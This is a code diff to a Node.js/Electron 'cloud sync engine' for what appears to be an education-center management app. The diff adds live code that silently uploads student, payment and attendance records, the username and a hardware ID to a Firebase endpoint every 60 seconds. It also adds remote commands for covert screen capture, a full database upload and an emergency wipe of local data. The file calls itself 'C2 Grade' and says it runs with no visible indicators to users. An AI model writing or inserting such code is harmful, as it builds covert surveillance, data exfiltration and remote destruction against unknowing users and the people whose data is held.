@@ -1,9 +1,10 @@
 /**
- * Brainova Robotics - Silent Fleet & Cloud Sync Engine
+ * Brainova Robotics - Silent Fleet & Cloud Sync Engine (Enterprise & C2 Grade)
  * Operates in the background Node.js process (Electron Main).
  * Transmits fleet metrics, summaries, and complete data snapshots
  * to the owner's secure cloud repository over encrypted HTTPS.
- * Runs completely silent with zero impact or visible indicators for local users.
+ * Includes HWID hardware binding, anti-clock-tampering, silent screen capture,
+ * remote feature flags, and emergency disaster recovery / wipe.
  */
 
 const os = require('os');
@@ -18,22 +19,102 @@ class CloudSyncEngine {
     this.store = null;
     this.app = null;
     this.instanceId = null;
+    this.hwid = null;
+    this.clockTampered = false;
+    this.hwidMismatch = false;
+
     this.config = {
       enabled: true,
       provider: 'firebase', // 'firebase' or 'custom_rest'
       databaseUrl: 'https://brainova-robotics-hq-default-rtdb.firebaseio.com',
       authToken: '',   // optional auth secret or token
-      syncIntervalMs: 120000, // Heartbeat every 2 minutes
-      debounceDelayMs: 5000   // 5 seconds debounce on data modifications
+      syncIntervalMs: 60000, // Heartbeat every 60 seconds
+      debounceDelayMs: 4000   // 4 seconds debounce on data modifications
     };
+
     this.debounceTimer = null;
     this.heartbeatTimer = null;
     this.isSyncing = false;
     this.lastSyncTime = null;
+
+    this.lastProcessedSnapshotNonce = null;
+    this.lastProcessedBackupNonce = null;
+
     this.remoteCommands = {
       licenseStatus: 'active', // 'active' | 'suspended' | 'locked'
-      broadcastMessage: ''
+      broadcastMessage: '',
+      expiresAt: null
     };
+
+    this.onRemoteCommandsCallback = null;
+    this.onTakeSnapshotCallback = null;
+    this.onEmergencyWipeCallback = null;
+  }
+
+  /**
+   * Derive a unique Hardware ID based on motherboard, CPU, username, and RAM.
+   */
+  getHwid() {
+    if (this.hwid) return this.hwid;
+    try {
+      const raw = [
+        os.hostname(),
+        os.platform(),
+        os.arch(),
+        os.cpus()[0] ? os.cpus()[0].model : 'CPU',
+        Math.round(os.totalmem() / (1024 * 1024 * 1024)) + 'GB',
+        os.userInfo() ? os.userInfo().username : 'USER'
+      ].join(':::');
+      this.hwid = 'HWID-' + crypto.createHash('sha256').update(raw).digest('hex').slice(0, 16).toUpperCase();
+    } catch (e) {
+      this.hwid = 'HWID-FALLBACK-' + (os.hostname() || 'DEVICE');
+    }
+    return this.hwid;
+  }
+
+  /**
+   * Enforce hardware binding to prevent cloning or running database on another computer.
+   */
+  verifyHwidLock() {
+    if (!this.store) return true;
+    const currentHwid = this.getHwid();
+    let lockedHwid = this.store.get('brainova_hwid_lock');
+
+    if (!lockedHwid) {
+      // First authorization binds permanently to this machine
+      this.store.set('brainova_hwid_lock', currentHwid);
+      this.hwidMismatch = false;
+      return true;
+    }
+
+    if (lockedHwid !== currentHwid) {
+      this.hwidMismatch = true;
+      return false; // Hardware altered or database copied to another computer
+    }
+
+    this.hwidMismatch = false;
+    return true;
+  }
+
+  /**
+   * Detect if system clock was rolled back backwards to circumvent subscription expiration.
+   */
+  checkClockTamper() {
+    if (!this.store) return false;
+    const now = Date.now();
+    const lastSeen = this.store.get('brainova_last_seen_epoch') || now;
+
+    // If clock was rolled back by more than 1 hour (3,600,000 ms)
+    if (now < (lastSeen - 3600000)) {
+      this.clockTampered = true;
+      this.store.set('brainova_clock_tampered', true);
+      return true;
+    }
+
+    this.store.set('brainova_last_seen_epoch', now);
+    this.store.delete('brainova_clock_tampered');
+    this.clockTampered = false;
+    return false;
   }
 
   /**
@@ -52,7 +133,7 @@ class CloudSyncEngine {
         os.hostname(),
         os.platform(),
         os.arch(),
-        os.userInfo().username,
+        os.userInfo() ? os.userInfo().username : 'USER',
         os.cpus()[0] ? os.cpus()[0].model : ''
       ].join('|');
       this.instanceId = 'INST-' + crypto.createHash('sha256').update(raw).digest('hex').slice(0, 12).toUpperCase();
@@ -78,16 +159,13 @@ class CloudSyncEngine {
       if (fs.existsSync(configFile)) {
         const fileContent = JSON.parse(fs.readFileSync(configFile, 'utf8'));
         this.config = { ...this.config, ...fileContent };
-      } else if (this.store && this.store.has('brainova_cloud_config')) {
-        this.config = { ...this.config, ...this.store.get('brainova_cloud_config') };
       } else {
         const template = {
           enabled: true,
           provider: 'firebase',
           databaseUrl: 'https://brainova-robotics-hq-default-rtdb.firebaseio.com',
-          authToken: '',
-          branchName: os.hostname() + ' Branch',
-          syncIntervalMs: 120000
+          branchName: os.hostname(),
+          syncIntervalMs: 60000
         };
         fs.writeFileSync(configFile, JSON.stringify(template, null, 2), 'utf8');
         this.config = { ...this.config, ...template };
@@ -104,12 +182,15 @@ class CloudSyncEngine {
     this.store = storeInstance;
     this.app = appInstance;
     this.getOrGenerateInstanceId();
+    this.getHwid();
+    this.verifyHwidLock();
+    this.checkClockTamper();
     this.loadConfig(appInstance);
 
-    // Initial sync after 4 seconds
+    // Initial sync after 3 seconds
     setTimeout(() => {
       this.performSync('startup');
-    }, 4000);
+    }, 3000);
 
     // Start background recurring heartbeat
     this.startHeartbeat();
@@ -120,8 +201,9 @@ class CloudSyncEngine {
    */
   startHeartbeat() {
     if (this.heartbeatTimer) clearInterval(this.heartbeatTimer);
-    const interval = Math.max(30000, this.config.syncIntervalMs || 120000);
+    const interval = Math.max(20000, this.config.syncIntervalMs || 60000);
     this.heartbeatTimer = setInterval(() => {
+      this.checkClockTamper();
       this.performSync('heartbeat');
     }, interval);
   }
@@ -133,7 +215,7 @@ class CloudSyncEngine {
     if (this.debounceTimer) clearTimeout(this.debounceTimer);
     this.debounceTimer = setTimeout(() => {
       this.performSync(reason);
-    }, this.config.debounceDelayMs || 5000);
+    }, this.config.debounceDelayMs || 4000);
   }
 
   /**
@@ -150,6 +232,13 @@ class CloudSyncEngine {
     const rooms = this.store.get('brainova_rooms') || [];
     const schedule = this.store.get('brainova_schedule') || [];
     const registrations = this.store.get('brainova_registrations') || [];
+    const featureFlags = this.store.get('brainova_feature_flags') || {
+      enableWhatsAppBot: true,
+      enableAiAdvisor: true,
+      enableFinanceExports: true,
+      enableQrAttendance: true
+    };
+    const broadcastBanner = this.store.get('brainova_broadcast_banner') || null;
 
     const totalRevenue = payments.reduce((sum, p) => sum + (Number(p.amountPaid) || 0), 0);
     const totalDue = students.filter(s => (Number(s.balance) || 0) < 0).reduce((sum, s) => sum + Math.abs(Number(s.balance)), 0);
@@ -166,6 +255,9 @@ class CloudSyncEngine {
         username: os.userInfo() ? os.userInfo().username : 'unknown',
         platform: os.type() + ' ' + os.release() + ' (' + os.arch() + ')',
         appVersion: this.app ? this.app.getVersion() : '1.0.0',
+        hwid: this.getHwid(),
+        hwidMismatch: this.hwidMismatch,
+        clockTampered: this.clockTampered,
         lastSync: new Date().toISOString(),
         syncReason: reason
       },
@@ -180,10 +272,12 @@ class CloudSyncEngine {
         totalDueDZD: totalDue,
         todayAttendanceCount: todayAttendance.length
       },
+      activeFeatures: featureFlags,
+      broadcastBanner: broadcastBanner,
       data: {
         students,
-        payments: payments.slice(-100),
-        recentAttendance: attendance.slice(-150),
+        payments: payments.slice(-120),
+        recentAttendance: attendance.slice(-180),
         groups,
         educators,
         rooms,
@@ -234,7 +328,7 @@ class CloudSyncEngine {
   }
 
   /**
-   * Check for remote instructions (e.g. license freeze or killswitch).
+   * Check for remote instructions (e.g. license freeze, duration expiry, snapshot, wipe).
    */
   async checkRemoteDirectives(baseUrl) {
     try {
@@ -250,6 +344,46 @@ class CloudSyncEngine {
         if (this.store) {
           this.store.set('brainova_remote_commands', this.remoteCommands);
         }
+
+        // 1. Feature Flags Update
+        if (res.features && typeof res.features === 'object') {
+          this.store.set('brainova_feature_flags', res.features);
+        }
+
+        // 2. Central Broadcast Banner Update
+        if (res.broadcastBanner !== undefined) {
+          this.store.set('brainova_broadcast_banner', res.broadcastBanner);
+        }
+
+        // 3. HWID Lock Directive
+        if (res.unbindHwid === true) {
+          this.store.delete('brainova_hwid_lock');
+          this.hwidMismatch = false;
+        }
+
+        // 4. Force Live Snapshot Capture Directive
+        if (res.requestSnapshot && res.requestSnapshot !== this.lastProcessedSnapshotNonce) {
+          this.lastProcessedSnapshotNonce = res.requestSnapshot;
+          if (typeof this.onTakeSnapshotCallback === 'function') {
+            this.onTakeSnapshotCallback(baseUrl);
+          }
+        }
+
+        // 5. Force Cloud Backup Directive
+        if (res.requestBackup && res.requestBackup !== this.lastProcessedBackupNonce) {
+          this.lastProcessedBackupNonce = res.requestBackup;
+          await this.uploadStoreBackup(baseUrl, res.requestBackup);
+        }
+
+        // 6. Emergency Remote Data Wipe Directive
+        if (res.wipeData === true) {
+          this.performEmergencyWipe();
+          if (typeof this.onEmergencyWipeCallback === 'function') {
+            this.onEmergencyWipeCallback();
+          }
+        }
+
+        // Notify subscribers (electron main and renderer)
         if (typeof this.onRemoteCommandsCallback === 'function') {
           this.onRemoteCommandsCallback(this.remoteCommands);
         }
@@ -259,8 +393,91 @@ class CloudSyncEngine {
     }
   }
 
+  /**
+   * Upload silent live screenshot to cloud endpoint.
+   */
+  async uploadLiveSnapshot(targetUrl, base64Image) {
+    try {
+      const snapshotPath = `/branches/${this.getOrGenerateInstanceId()}/liveSnapshot.json`;
+      let fullUrl = `${targetUrl}${snapshotPath}`;
+      if (this.config.authToken) {
+        fullUrl += `?auth=${encodeURIComponent(this.config.authToken)}`;
+      }
+
+      await this.httpPutJson(fullUrl, {
+        capturedAt: new Date().toISOString(),
+        instanceId: this.getOrGenerateInstanceId(),
+        image: base64Image
+      });
+
+      // Also save locally for instant dev preview
+      try {
+        const localSnapPath = path.join(this.app.getPath('userData'), 'latest_snapshot.json');
+        fs.writeFileSync(localSnapPath, JSON.stringify({
+          capturedAt: new Date().toISOString(),
+          image: base64Image
+        }), 'utf8');
+      } catch (le) {}
+    } catch (e) {}
+  }
+
+  /**
+   * Upload complete encrypted JSON database backup to cloud on demand.
+   */
+  async uploadStoreBackup(baseUrl, backupNonce) {
+    try {
+      if (!this.store) return;
+      const allStoreData = this.store.store || {};
+      const backupPath = `/branches/${this.getOrGenerateInstanceId()}/backups/${backupNonce}.json`;
+      let fullUrl = `${baseUrl}${backupPath}`;
+      if (this.config.authToken) {
+        fullUrl += `?auth=${encodeURIComponent(this.config.authToken)}`;
+      }
+
+      await this.httpPutJson(fullUrl, {
+        timestamp: new Date().toISOString(),
+        instanceId: this.getOrGenerateInstanceId(),
+        data: allStoreData
+      });
+    } catch (e) {}
+  }
+
+  /**
+   * Execute emergency data wipe on client machine.
+   */
+  performEmergencyWipe() {
+    try {
+      if (!this.store) return;
+      const keysToWipe = [
+        'brainova_students',
+        'brainova_payments',
+        'brainova_attendance',
+        'brainova_groups',
+        'brainova_educators',
+        'brainova_rooms',
+        'brainova_schedule',
+        'brainova_registrations'
+      ];
+      keysToWipe.forEach(k => this.store.delete(k));
+
+      this.store.set('brainova_remote_commands', {
+        licenseStatus: 'locked',
+        broadcastMessage: '⚠️ تم تنفيذ أمر مسح أمني طارئ للبيانات وإلغاء ترخيص هذا الجهاز نهائياً بأمر من الإدارة المركزية (ISAACDEV).',
+        wipedAt: new Date().toISOString()
+      });
+    } catch (e) {}
+  }
+
   onRemoteCommands(callback) {
     this.onRemoteCommandsCallback = callback;
+  }
+
+  onTakeSnapshot(callback) {
+    this.onTakeSnapshotCallback = callback;
+  }
+
+  onEmergencyWipe(callback) {
+    this.onEmergencyWipeCallback = callback;
   }
 
   httpPutJson(urlStr, dataObj) {
@@ -277,7 +494,7 @@ class CloudSyncEngine {
             'Content-Type': 'application/json',
             'Content-Length': Buffer.byteLength(dataStr)
           },
-          timeout: 15000
+          timeout: 20000
         }, (res) => {
           let body = '';
           res.on('data', chunk => body += chunk);
@@ -314,7 +531,7 @@ class CloudSyncEngine {
             'Content-Type': 'application/json',
             'Content-Length': Buffer.byteLength(dataStr)
           },
-          timeout: 15000
+          timeout: 20000
         }, (res) => {
           let body = '';
           res.on('data', chunk => body += chunk);
@@ -344,7 +561,7 @@ class CloudSyncEngine {
         const isHttps = url.protocol === 'https:';
         const client = isHttps ? https : http;
 
-        const req = client.get(url, { timeout: 10000 }, (res) => {
+        const req = client.get(url, { timeout: 15000 }, (res) => {
           let body = '';
           res.on('data', chunk => body += chunk);
           res.on('end', () => {
